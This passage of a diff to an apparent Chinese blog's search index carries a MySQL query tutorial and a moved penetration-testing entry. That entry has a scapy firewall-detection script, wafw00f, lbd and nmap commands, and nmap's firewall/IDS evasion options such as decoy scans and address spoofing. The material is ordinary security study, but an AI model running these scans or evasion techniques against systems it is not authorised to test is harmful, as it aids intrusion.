by语句之后,则必须要对该字段进行聚合函数处理</li></ul></li></ul></li><li><p><strong>having</strong></p><ul><li>作用 : 对查询的结果进行进一步筛选</li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select country,avg(gongji) as pjgj from sanguo group by country having pjgj &gt; 105 order by pjgj desc limit 2;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>having语句通常与group by语句联合使用,用来过滤由group by语句返回的记录集</li><li>having语句的存在弥补了where条件子句不能与聚合函数联合使用的不足,where操作的是表中实际存在的字段,having操作的是聚合函数生成的显示列</li></ul></li></ul></li><li><p><strong>distinct</strong></p><ul><li>作用: 去重,不显示字段的重复值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select distinct name,country from sanguo;</span><br><span class="line">select count(distinct name) from sanguo where country &#x3D; &quot;蜀国&quot;;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>distinct处理的是distinct和from之间的所有字段,所有字段值必须完全相同才可以去重</li><li>distinct不能对任何字段做聚合处理</li></ul></li></ul></li><li><p><strong>查询表记录时可以做数学运算</strong></p><ul><li>运算符<br>  <code>+ - * / %</code></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,gongji*10,country from sanguo;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>约束</strong></p><ul><li>作用<ul><li>为了保证数据的完整性,一致性,有效性,可以限制无效的数据插入到数据表中</li></ul></li><li>约束分类<ul><li>默认约束(default)<ul><li>作用<ul><li>在插入记录时,如果不给该字段赋值,则使用默认值</li></ul></li><li>格式<ul><li><code>字段名 数据类型 default 默认值,</code></li></ul></li></ul></li><li>非空约束<ul><li>作用<ul><li>不允许该字段的值有空值NULL记录</li></ul></li><li>格式<ul><li><code>字段名 数据类型 not null,</code></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> SQL查询 </tag>
+            
+            <tag> regexp </tag>
             
         </tags>
       
@@ -3386,13 +3572,13 @@
             
             <tag> python </tag>
             
+            <tag> C </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
             <tag> DoS攻击 </tag>
-            
-            <tag> C </tag>
             
             <tag> Smurf </tag>
             
@@ -3512,43 +3698,6 @@
     
     
     <entry>
-      <title>WAF扫描识别及负载均衡识别</title>
-      <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
-      <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a><strong>防火墙识别</strong></h3><p>通过检查回包,可能识别端口是否经过防火墙过滤<br>设备多种多样,结果存在一定误差</p></blockquote><table><thead><tr><th align="center">No.</th><th align="center">Send</th><th align="center">Response</th><th align="left">Type</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">syn</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">1</td><td align="center">ack</td><td align="center">rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">ack</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">3</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">3</td><td align="center">ack</td><td align="center">rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">4</td><td align="center">syn</td><td align="center">No</td><td align="left">Closed</td></tr><tr><td align="center">4</td><td align="center">ack</td><td align="center">No</td><td align="left">Closed</td></tr></tbody></table><h4 id="python–scapy-firewall-detect-py-1-1-1-1-443"><a href="#python–scapy-firewall-detect-py-1-1-1-1-443" class="headerlink" title="python–scapy ./firewall_detect.py 1.1.1.1 443"></a><strong>python–scapy</strong> <code>./firewall_detect.py 1.1.1.1 443</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./firewall_detect.py [Target IP] [Target Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./firewall_detect.py 1.1.1.1 443"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is either unstatefully filtered or host is down"</span></span><br><span class="line"><span class="keyword">elif</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">or</span> (SYN_response==<span class="literal">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>)):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Stateful filtering in place"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and open"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and closed"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unable to determine if the port is filtered"</span></span><br></pre></td></tr></table></figure><h4 id="Nmap有系列防火墙过滤检测功能"><a href="#Nmap有系列防火墙过滤检测功能" class="headerlink" title="Nmap有系列防火墙过滤检测功能"></a><strong>Nmap</strong>有系列防火墙过滤检测功能</h4><pre><code>nmap -sA 192.168.254.254 -p 22</code></pre><blockquote><h4 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a><strong>负载均衡识别</strong></h4><p>广域网负载均衡<br>    DNS轮询<br>    一个域名解析多个A纪录<br>    智能DNS<br>服务器负载均衡<br>HTTP-Loadbalancing<br>    Nginx<br>    Apache</p></blockquote><h4 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a><strong>lbd</strong></h4><pre><code>lbd www.baidu.comlbd mail.163.com</code></pre><blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a><strong>WAF识别</strong></h3></blockquote><h4 id="wafw00f-web应用防火墙识别"><a href="#wafw00f-web应用防火墙识别" class="headerlink" title="wafw00f web应用防火墙识别"></a><strong>wafw00f</strong> web应用防火墙识别</h4><pre><code>wafw00f -lwafw00f http://google.com</code></pre><h3 id="nmap-web应用防火墙识别"><a href="#nmap-web应用防火墙识别" class="headerlink" title="nmap web应用防火墙识别"></a><strong>nmap</strong> web应用防火墙识别</h3><pre><code>nmap google.com --script=http-waf-detect.nse</code></pre><h4 id="nmap所有参数-man-nmap"><a href="#nmap所有参数-man-nmap" class="headerlink" title="nmap所有参数 man nmap"></a><strong>nmap所有参数 man nmap</strong></h4><pre><code>-iL filename                   从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                    随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]      从扫描任务中需要排除的主机--exculdefile exclude_file     排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><p><strong>主机发现</strong></p><pre><code>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析--dns-servers 8.8.8.8     根据DNS服务地址扫描--system-dns            使用系统在DNS扫描--traceroute            路由追踪</code></pre><p><strong>扫描技巧</strong></p><pre><code>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP Null，FIN，and Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><p><strong>指定端口和扫描顺序</strong></p><pre><code>-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</code></pre><p><strong>服务版本识别</strong></p><pre><code>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><p><strong>脚本扫描</strong></p><pre><code>-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助</code></pre><p><strong>OS识别</strong></p><pre><code>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</code></pre><p><strong>防火墙/IDS躲避和哄骗</strong></p><pre><code>-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><p><strong>Nmap 输出</strong></p><pre><code>-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><p><strong>时间性能优化</strong></p><pre><code>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--max-retries　　调整重传次数。--min-hostgroup/--max-hostgroup size 　　设置组的大小--min-parallelism/--max-parellelism time　　指定时间内的探针数--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时--scan-delay/-max-scan-delay time 　　指定探针之间的时延--max-retries tries　　指定探针重传转发数--host-timeout time　　设置扫描主机的最大时间--defeat-rst-ratelimit　　设置rst的限制</code></pre><p><strong>其他nmap选项</strong></p><pre><code>-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> nmap </tag>
-            
-            <tag> lbd </tag>
-            
-            <tag> WAF </tag>
-            
-            <tag> wafw00f </tag>
-            
-            <tag> 负载均衡 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SMB扫描及SMTP扫描</title>
       <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
       <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
@@ -3580,6 +3729,43 @@
             <tag> nbtscan </tag>
             
             <tag> enum4linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WAF扫描识别及负载均衡识别</title>
+      <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
+      <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a><strong>防火墙识别</strong></h3><p>通过检查回包,可能识别端口是否经过防火墙过滤<br>设备多种多样,结果存在一定误差</p></blockquote><table><thead><tr><th align="center">No.</th><th align="center">Send</th><th align="center">Response</th><th align="left">Type</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">syn</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">1</td><td align="center">ack</td><td align="center">rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">ack</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">3</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">3</td><td align="center">ack</td><td align="center">rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">4</td><td align="center">syn</td><td align="center">No</td><td align="left">Closed</td></tr><tr><td align="center">4</td><td align="center">ack</td><td align="center">No</td><td align="left">Closed</td></tr></tbody></table><h4 id="python–scapy-firewall-detect-py-1-1-1-1-443"><a href="#python–scapy-firewall-detect-py-1-1-1-1-443" class="headerlink" title="python–scapy ./firewall_detect.py 1.1.1.1 443"></a><strong>python–scapy</strong> <code>./firewall_detect.py 1.1.1.1 443</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./firewall_detect.py [Target IP] [Target Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./firewall_detect.py 1.1.1.1 443"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is either unstatefully filtered or host is down"</span></span><br><span class="line"><span class="keyword">elif</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">or</span> (SYN_response==<span class="literal">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>)):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Stateful filtering in place"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and open"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and closed"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unable to determine if the port is filtered"</span></span><br></pre></td></tr></table></figure><h4 id="Nmap有系列防火墙过滤检测功能"><a href="#Nmap有系列防火墙过滤检测功能" class="headerlink" title="Nmap有系列防火墙过滤检测功能"></a><strong>Nmap</strong>有系列防火墙过滤检测功能</h4><pre><code>nmap -sA 192.168.254.254 -p 22</code></pre><blockquote><h4 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a><strong>负载均衡识别</strong></h4><p>广域网负载均衡<br>    DNS轮询<br>    一个域名解析多个A纪录<br>    智能DNS<br>服务器负载均衡<br>HTTP-Loadbalancing<br>    Nginx<br>    Apache</p></blockquote><h4 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a><strong>lbd</strong></h4><pre><code>lbd www.baidu.comlbd mail.163.com</code></pre><blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a><strong>WAF识别</strong></h3></blockquote><h4 id="wafw00f-web应用防火墙识别"><a href="#wafw00f-web应用防火墙识别" class="headerlink" title="wafw00f web应用防火墙识别"></a><strong>wafw00f</strong> web应用防火墙识别</h4><pre><code>wafw00f -lwafw00f http://google.com</code></pre><h3 id="nmap-web应用防火墙识别"><a href="#nmap-web应用防火墙识别" class="headerlink" title="nmap web应用防火墙识别"></a><strong>nmap</strong> web应用防火墙识别</h3><pre><code>nmap google.com --script=http-waf-detect.nse</code></pre><h4 id="nmap所有参数-man-nmap"><a href="#nmap所有参数-man-nmap" class="headerlink" title="nmap所有参数 man nmap"></a><strong>nmap所有参数 man nmap</strong></h4><pre><code>-iL filename                   从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                    随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]      从扫描任务中需要排除的主机--exculdefile exclude_file     排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><p><strong>主机发现</strong></p><pre><code>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析--dns-servers 8.8.8.8     根据DNS服务地址扫描--system-dns            使用系统在DNS扫描--traceroute            路由追踪</code></pre><p><strong>扫描技巧</strong></p><pre><code>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP Null，FIN，and Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><p><strong>指定端口和扫描顺序</strong></p><pre><code>-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</code></pre><p><strong>服务版本识别</strong></p><pre><code>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><p><strong>脚本扫描</strong></p><pre><code>-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助</code></pre><p><strong>OS识别</strong></p><pre><code>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</code></pre><p><strong>防火墙/IDS躲避和哄骗</strong></p><pre><code>-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><p><strong>Nmap 输出</strong></p><pre><code>-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><p><strong>时间性能优化</strong></p><pre><code>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--max-retries　　调整重传次数。--min-hostgroup/--max-hostgroup size 　　设置组的大小--min-parallelism/--max-parellelism time　　指定时间内的探针数--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时--scan-delay/-max-scan-delay time 　　指定探针之间的时延--max-retries tries　　指定探针重传转发数--host-timeout time　　设置扫描主机的最大时间--defeat-rst-ratelimit　　设置rst的限制</code></pre><p><strong>其他nmap选项</strong></p><pre><code>-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> lbd </tag>
+            
+            <tag> WAF </tag>
+            
+            <tag> wafw00f </tag>
+            
+            <tag> 负载均衡 </tag>
             
         </tags>
       
